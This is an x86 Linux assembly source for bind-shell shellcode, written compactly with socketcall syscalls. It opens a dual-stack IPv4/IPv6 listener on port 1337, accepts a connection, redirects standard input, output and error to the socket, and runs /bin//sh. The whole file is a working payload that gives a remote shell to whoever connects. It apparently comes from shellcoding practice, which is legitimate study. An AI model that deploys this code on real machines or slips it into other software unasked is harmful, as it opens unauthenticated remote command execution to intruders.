global _start

section .text

_start:
  ; socket
  ;; cleanup
  xor eax, eax
  xor ebx, ebx
  ;; arguments
  push eax        ; #define IP_PROTO 0
  push 0x1        ; #define SOCK_STREAM 1
  push 0xa        ; #define PF_INET6 10
  ;; function
  mov ecx, esp    ; pointer to args on the stack into ecx
  mov al, 0x66    ; socketcall 0x66 == 102
  inc ebx         ; #define SYS_SOCKET 1
  ;; call
  int 0x80
  ;; returned data
  xchg esi, eax   ; sockfd eax -> esi

  ; setsocketopt
  ;; cleanup
  xor eax, eax
  xor ebx, ebx
  ;; arguments
  push eax        ; NO = 0x0
  mov edx, esp    ; get a pointer to the null value
  push 0x2        ; sizeof(NO)
  push edx        ; pointer to NO
  push 0x1a       ; #define IPV6_V6ONLY 26
  push 0x29       ; #define IPPROTO_IPV6
  ;; function
  mov ecx, esp    ; pointer to args on the stack into ecx
  mov al, 0x66    ; socketcall 0x66 == 102
  mov bl, 0xe     ; #define SYS_SETSOCKOPT
  ;; call
  int 0x80

  ; bind ipv4
  ;; cleanup
  xor eax, eax
  xor ebx, ebx
  xor edx, edx
  ;; v4lhost struct
  push edx          ; #define INADDR_ANY 0
  push word 0x3905  ; port 1337 in big endian format
  push 0x2          ; #define AF_INET 2
  ;; arguments
  mov ecx, esp      ; pointer to v4lhost struct arguments
  push byte 0x10    ; sizeof v4lhost
  push ecx          ; pointer v4lhost
  push esi          ; push sockfd onto stack
  ;; function
  mov ecx, esp      ; argument pointer into ecx
  mov bl, 0x2       ; #define SYS_BIND 2
  mov al, 0x66      ; socketcall 0x66 == 102
  ;; call
  int 0x80

  ; bind ipv6
  ;; cleanup
  xor eax, eax
  xor ebx, ebx
  xor edx, edx
  ;; v6lhost struct
  push dword eax    ; v6_host.sin6_addr
  push dword eax
  push dword eax
  push dword eax
  push dword eax
  push word 0x3905  ; port 1337
  push word 0x0a    ; PF_INET6
  ;; arguments
  mov ecx, esp      ; pointer to struct into ecx
  push 0x1c         ; sizeof struct
  push ecx          ; pointer to struct
  push esi          ; sockfd
  ;; function
  mov ecx, esp      ; arguments into register
  mov bl, 0x2       ; #define SYS_BIND 2
  mov al, 0x66      ; socketcall 0x66 == 102
  ;; call
  int 0x80

  ; listen
  ;; cleanup
  xor eax, eax
  xor ebx, ebx
  ;; arguments
  push byte 0x2     ; queuelimit = 2
  push esi          ; sockfd
  ;; function
  mov ecx, esp      ; pointer to args into ecx
  mov bl, 0x4       ; #define SYS_LISTEN 4
  mov al, 0x66      ; socketcall 0x66 == 102
  ;; call
  int 0x80

  ; accept
  ;; cleanup
  xor ebx, ebx
  ;;arguments
  push ebx          ; push NULL
  push ebx          ; push NULL
  push esi          ; sockfd
  ;; function
  mov ecx, esp      ; pointer to args into ecx
  mov bl, 0x5       ; #define SYS_ACCEPT 5
  mov al, 0x66      ; socketcall 0x66 == 102
  ;; call
  int 0x80
  ;; returned data
  xchg ebx, eax     ; ebx holds the new sockfd that we accepted

  ; dup file descriptor
  ;; setup counters
  sub ecx, ecx      ; zero out ecx
  mov cl, 0x2       ; create a counter
  ;; loop
duploop:
  mov al, 0x3f      ; SYS_DUP2 syscall
  int 0x80          ; call SYS_DUP2
  dec ecx           ; decrement loop counter
  jns duploop       ; as long as SF is not set, keep looping

  ; execve
  ;; cleanup
  xor edx, edx
  ;; command to run
  push edx          ; NULL string terminator
  push 0x68732f2f   ; hs//
  push 0x6e69622f   ; nib/
  ;; arguments
  mov ebx, esp      ; pointer to args into ebx
  push edx          ; null ARGV
  push ebx          ; command to run
  ;; function
  mov ecx, esp
  mov al, 0x0b      ; execve systemcall
  int 0x80
